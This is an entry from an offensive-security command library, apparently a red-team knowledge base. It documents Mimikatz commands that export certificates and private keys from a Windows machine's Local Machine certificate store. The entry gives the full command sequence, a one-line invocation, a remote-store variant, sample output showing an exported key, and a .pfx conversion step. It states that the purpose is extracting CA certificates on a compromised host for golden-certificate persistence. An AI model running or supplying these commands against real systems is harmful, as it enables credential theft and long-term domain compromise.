---
id: a60b95fd-8edd-4c6d-b233-ada9de0a04dc
name: mimikatz-export-local-machine-certificates
type: command
executor: powershell
data: |-
  privilege::debug
  crypto::capi
  crypto::cng
  crypto::certificates /systemstore:local_machine /store:my /export
output: null
created_at: '2023-04-06T03:56:28.398187+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - certificate-export
  - mimikatz
verified: true
validated: true
---

# mimikatz-export-local-machine-certificates

## Command

```powershell
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /store:my /export
```

## Description

This multi-line Mimikatz invocation enables debug privileges and exports all certificates from the Local Machine Personal (My) store using both CAPI and CNG providers. Use this on a compromised Windows host to extract CA certificates for forging in persistence attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/systemstore:local_machine` | Targets the Local Machine certificate store | Yes |
| `/store:my` | Specifies the Personal (My) store | Yes |
| `/export` | Exports certificates to .der files in the current directory | Yes |

## Examples

### Basic Usage

Run inside Mimikatz.exe (launched as admin):

```powershell
mimikatz.exe "privilege::debug" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:local_machine /store:my /export" exit
```

### Advanced Usage

Export from Remote Machine store (if accessible):

```powershell
crypto::certificates /systemstore:remote_machine /store:my /export
```

## Expected Output

Mimikatz lists stores and exports files:

```
*** 'local_machine' store:
  * Store 'my':
    * Cert CN=Lab-CA
      Export: cert_1.der
  User key exported to: my.key
```

Files like 'cert_1.der' and 'my.key' are created; use certutil to convert to .pfx.

## Related

- [[procedures/Golden-Certificate-Domain-Persistence]]
- [[tools/Mimikatz]]
